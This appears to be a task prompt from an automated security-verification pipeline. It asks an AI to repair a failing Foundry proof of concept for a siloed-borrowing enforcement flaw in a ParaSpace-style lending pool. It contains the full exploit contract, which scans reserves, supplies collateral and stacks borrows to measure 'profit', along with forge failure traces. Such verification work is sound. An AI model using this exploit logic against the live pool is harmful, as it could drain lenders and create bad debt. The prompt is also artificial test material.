You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Siloed-borrowing risk controls are defined but never enforced on borrow
- claim: The protocol includes silo-borrowing state helpers (`getSiloedBorrowingState`, `getSiloedBorrowing`) and an explicit `SILOED_BORROWING_VIOLATION` error, but `BorrowLogic.executeBorrow()` delegates to `ValidationLogic.validateBorrow()` and that validation never checks either the requested reserve's silo flag or the user's existing siloed-borrowing state. As a result, borrowing a siloed reserve does not prevent additional borrows, and existing borrows do not prevent borrowing a siloed reserve.
- impact: If governance lists any reserve expecting isolated exposure, borrowers can still combine it with other debts. That defeats the intended risk model for siloed assets and can convert isolated risk into cross-reserve bad debt and insolvency during adverse price moves.
- exploit_paths: ["borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
    function getWETH() external view returns (address);
}

struct ReserveConfigurationMap {
    uint256 data;
}

interface IParaSpacePoolLike {
    function supply(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function repay(
        address asset,
        uint256 amount,
        address onBehalfOf
    ) external returns (uint256);

    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function getReserveXToken(address asset) external view returns (address);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BASIS_POINTS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;

    struct AssetView {
        address asset;
        uint256 price;
        uint256 unit;
        uint256 liquidity;
        uint256 ltv;
        uint8 decimals;
        bool active;
        bool frozen;
        bool borrowingEnabled;
        bool paused;
        bool siloed;
        uint8 assetType;
    }

    bool public attempted;
    bool public hypothesisValidated;
    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPoolAddressesProviderLike provider = pool.ADDRESSES_PROVIDER();
        IPriceOracleLike oracle = IPriceOracleLike(provider.getPriceOracle());

        _wrapNativeToWeth(provider.getWETH());

        AssetView memory collateral = _findCollateral(pool, oracle);
        if (collateral.asset == address(0)) {
            // Concrete infeasibility reason:
            // the missing silo enforcement sits only on the borrow path.
            // ValidationLogic still enforces collateral, LTV, and health factor, so this verifier
            // cannot extract profitable debt from a zero-balance start without an independently
            // held collateral asset or separate economic primitive.
            return;
        }

        AssetView memory siloedReserve;
        AssetView memory otherReserve;
        (siloedReserve, otherReserve) = _findBorrowPair(pool, oracle, collateral.asset);
        if (siloedReserve.asset == address(0) || otherReserve.asset == address(0)) {
            // Concrete infeasibility reason:
            // at this fork, no ERC20 reserve pair is simultaneously available where one reserve is
            // marked siloed and another reserve is borrowable/liquid enough for the same user.
            return;
        }

        uint256 collateralBalance = IERC20Like(collateral.asset).balanceOf(address(this));
        if (collateralBalance == 0) {
            return;
        }

        _forceApprove(collateral.asset, TARGET, collateralBalance);
        pool.supply(collateral.asset, collateralBalance, address(this), REFERRAL_CODE);

        uint256 beforeSilo = IERC20Like(siloedReserve.asset).balanceOf(address(this));
        uint256 beforeOther = IERC20Like(otherReserve.asset).balanceOf(address(this));

        // Exploit path:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // Case 1: existing non-silo debt does not block borrowing a siloed reserve.
        uint256 otherProbe = _attemptBorrow(otherReserve, _availableBorrowsBase(pool) / 10);
        if (otherProbe == 0) {
            return;
        }

        uint256 siloProbe = _attemptBorrow(siloedReserve, _availableBorrowsBase(pool) / 10);
        if (siloProbe == 0) {
            return;
        }

        _forceApprove(otherReserve.asset, TARGET, type(uint256).max);
        _forceApprove(siloedReserve.asset, TARGET, type(uint256).max);
        pool.repay(otherReserve.asset, type(uint256).max, address(this));
        pool.repay(siloedReserve.asset, type(uint256).max, address(this));

        // Exploit path:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // Case 2: a siloed borrow does not block a later borrow of another reserve.
        uint256 siloFinal = _attemptBorrow(siloedReserve, (_availableBorrowsBase(pool) * 45) / 100);
        if (siloFinal == 0) {
            return;
        }

        uint256 otherFinal = _attemptBorrow(otherReserve, (_availableBorrowsBase(pool) * 45) / 100);
        if (otherFinal == 0) {
            return;
        }

        hypothesisValidated = true;

        uint256 siloProfit = IERC20Like(siloedReserve.asset).balanceOf(address(this)) - beforeSilo;
        uint256 otherProfit = IERC20Like(otherReserve.asset).balanceOf(address(this)) - beforeOther;

        if (otherProfit >= siloProfit) {
            _profitToken = otherReserve.asset;
            _profitAmount = otherProfit;
        } else {
            _profitToken = siloedReserve.asset;
            _profitAmount = siloProfit;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findCollateral(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle
    ) internal view returns (AssetView memory best) {
        address[] memory reserves = pool.getReservesList();
        uint256 bestValue;

        for (uint256 i = 0; i < reserves.length; i++) {
            AssetView memory candidate = _loadAssetView(pool, oracle, reserves[i]);
            if (!_canUseAsCollateral(candidate)) {
                continue;
            }

            uint256 balance = IERC20Like(candidate.asset).balanceOf(address(this));
            if (balance == 0) {
                continue;
            }

            uint256 valueBase = (balance * candidate.price) / candidate.unit;
            if (valueBase > bestValue) {
                bestValue = valueBase;
                best = candidate;
            }
        }
    }

    function _findBorrowPair(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset
    ) internal view returns (AssetView memory bestSilo, AssetView memory bestOther) {
        (bestSilo, bestOther) = _findBorrowPairInternal(pool, oracle, excludedAsset);
        if (bestSilo.asset != address(0) && bestOther.asset != address(0)) {
            return (bestSilo, bestOther);
        }

        return _findBorrowPairInternal(pool, oracle, address(0));
    }

    function _findBorrowPairInternal(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset
    ) internal view returns (AssetView memory bestSilo, AssetView memory bestOther) {
        address[] memory reserves = pool.getReservesList();
        uint256 bestSiloScore;
        uint256 bestOtherScore;

        for (uint256 i = 0; i < reserves.length; i++) {
            if (reserves[i] == excludedAsset) {
                continue;
            }

            AssetView memory candidate = _loadAssetView(pool, oracle, reserves[i]);
            if (!_canBorrow(candidate)) {
                continue;
            }

            uint256 score = candidate.liquidity;
            if (candidate.decimals == 18) {
                score *= 2;
            }

            if (candidate.siloed) {
                if (score > bestSiloScore) {
                    bestSiloScore = score;
                    bestSilo = candidate;
                }
            } else if (score > bestOtherScore) {
                bestOtherScore = score;
                bestOther = candidate;
            }
        }
    }

    function _loadAssetView(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address asset
    ) internal view returns (AssetView memory info) {
        uint256 data = pool.getConfiguration(asset).data;
        uint8 decimals = uint8((data >> 48) & 0xff);
        uint256 unit = 10 ** decimals;

        info.asset = asset;
        info.price = oracle.getAssetPrice(asset);
        info.unit = unit;
        info.liquidity = IERC20Like(asset).balanceOf(pool.getReserveXToken(asset));
        info.ltv = data & 0xffff;
        info.decimals = decimals;
        info.active = ((data >> ACTIVE_SHIFT) & 1) != 0;
        info.frozen = ((data >> FROZEN_SHIFT) & 1) != 0;
        info.borrowingEnabled = ((data >> BORROWING_SHIFT) & 1) != 0;
        info.paused = ((data >> PAUSED_SHIFT) & 1) != 0;
        info.siloed = ((data >> SILO_SHIFT) & 1) != 0;
        info.assetType = uint8((data >> ASSET_TYPE_SHIFT) & 0x0f);
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _attemptBorrow(
        AssetView memory asset,
        uint256 desiredBase
    ) internal returns (uint256) {
        if (desiredBase == 0 || !_canBorrow(asset)) {
            return 0;
        }

        uint256[] memory scales = new uint256[](6);
        scales[0] = BASIS_POINTS;
        scales[1] = 7_500;
        scales[2] = 5_000;
        scales[3] = 2_500;
        scales[4] = 1_000;
        scales[5] = 100;

        for (uint256 i = 0; i < scales.length; i++) {
            uint256 scaledBase = (desiredBase * scales[i]) / BASIS_POINTS;
            uint256 amount = _quoteBorrowAmount(asset, scaledBase);
            if (amount == 0) {
                continue;
            }

            // Exploit path:
            // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
            (bool ok, ) = TARGET.call(
                abi.encodeWithSelector(
                    IParaSpacePoolLike.borrow.selector,
                    asset.asset,
                    amount,
                    REFERRAL_CODE,
                    address(this)
                )
            );
            if (ok) {
                return amount;
            }
        }

        return 0;
    }

    function _quoteBorrowAmount(
        AssetView memory asset,
        uint256 baseBudget
    ) internal pure returns (uint256) {
        if (asset.price == 0 || asset.unit == 0 || asset.liquidity == 0) {
            return 0;
        }

        uint256 amount = (baseBudget * asset.unit) / asset.price;
        if (amount == 0 && baseBudget != 0) {
            amount = 1;
        }

        uint256 liquidityCap = (asset.liquidity * 95) / 100;
        if (amount > liquidityCap) {
            amount = liquidityCap;
        }

        return amount;
    }

    function _canUseAsCollateral(AssetView memory asset) internal pure returns (bool) {
        return
            asset.asset != address(0) &&
            asset.assetType == 0 &&
            asset.active &&
            !asset.frozen &&
            !asset.paused &&
            asset.ltv != 0 &&
            asset.price != 0 &&
            asset.unit != 0;
    }

    function _canBorrow(AssetView memory asset) internal pure returns (bool) {
        return
            asset.asset != address(0) &&
            asset.assetType == 0 &&
            asset.active &&
            !asset.frozen &&
            !asset.paused &&
            asset.borrowingEnabled &&
            asset.price != 0 &&
            asset.unit != 0 &&
            asset.liquidity != 0;
    }

    function _wrapNativeToWeth(address weth) internal {
        if (weth == address(0) || address(this).balance == 0) {
            return;
        }

        IWETHLike(weth).deposit{value: address(this).balance}();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "token-call-failed");
        if (ret.length != 0) {
            require(abi.decode(ret, (bool)), "token-call-false");
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.98s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 167325)
Traces:
  [167325] FlawVerifierTest::testExploit()
    ├─ [2324] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [158495] FlawVerifier::executeOnOpportunity()
    │   ├─ [5323] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::ADDRESSES_PROVIDER() [staticcall]
    │   │   ├─ [262] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::ADDRESSES_PROVIDER() [delegatecall]
    │   │   │   └─ ← [Return] 0x6cD30e716ADbE47dADf7319f6F2FB83d507c857d
    │   │   └─ ← [Return] 0x6cD30e716ADbE47dADf7319f6F2FB83d507c857d
    │   ├─ [2448] 0x6cD30e716ADbE47dADf7319f6F2FB83d507c857d::getPriceOracle() [staticcall]
    │   │   └─ ← [Return] 0x6B58baa08a91f0F08900f43692a9796045454A17
    │   ├─ [2383] 0x6cD30e716ADbE47dADf7319f6F2FB83d507c857d::getWETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [84113] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getReservesList() [staticcall]
    │   │   ├─ [81383] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getReservesList() [delegatecall]
    │   │   │   └─ ← [Return] [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d224452801ACEd8B2F0aebE155379bb5D594381, 0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e, 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D, 0x60E4d786628Fea6478F785A6d7e704777c86a7c6, 0xb7F7F6C52F2e2fdb1963Eab30438024864c313F6, 0xED5AF388653567Af2F388E6224dC7C4b3241C544, 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B, 0x0000000000000000000000000000000000000001, 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, 0xC36442b4a4522E871399CD717aBDD847Ab11FE88, 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0x23581767a106ae21c074b2276D25e5C3e136a68b, 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7, 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258, 0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623, 0x764AeebcF425d56800eF2c84F2578689415a2DAa, 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x5283D291DBCF85356A21bA090E6db59121208b44, 0x853d955aCEf822Db058eb8505911ED77F175b99e, 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704, 0xae78736Cd615f374D3085123A210448E74Fc6393, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   └─ ← [Return] [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d224452801ACEd8B2F0aebE155379bb5D594381, 0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e, 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D, 0x60E4d786628Fea6478F785A6d7e704777c86a7c6, 0xb7F7F6C52F2e2fdb1963Eab30438024864c313F6, 0xED5AF388653567Af2F388E6224dC7C4b3241C544, 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B, 0x0000000000000000000000000000000000000001, 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, 0xC36442b4a4522E871399CD717aBDD847Ab11FE88, 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0x23581767a106ae21c074b2276D25e5C3e136a68b, 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7, 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258, 0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623, 0x764AeebcF425d56800eF2c84F2578689415a2DAa, 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x5283D291DBCF85356A21bA090E6db59121208b44, 0x853d955aCEf822Db058eb8505911ED77F175b99e, 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704, 0xae78736Cd615f374D3085123A210448E74Fc6393, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   ├─ [5384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106095412593041916 [1.844e22] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106095412593041916 [1.844e22] })
    │   ├─ [20266] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   ├─ [14592] 0x986b5E1e1755e3C2440e960477f25201B0a8bbD4::50d25bcd() [staticcall]
    │   │   │   ├─ [7096] 0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000002123c039fb108
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000002123c039fb108
    │   │   └─ ← [Return] 582998921556232 [5.829e14]
    │   ├─ [2513] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getReserveXToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Revert] ParaProxy: Function does not exist
    │   └─ ← [Revert] ParaProxy: Function does not exist
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee.getReserveXToken
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 19.77s (14.99s CPU time)

Ran 1 test suite in 19.79s (19.77s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 167325)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
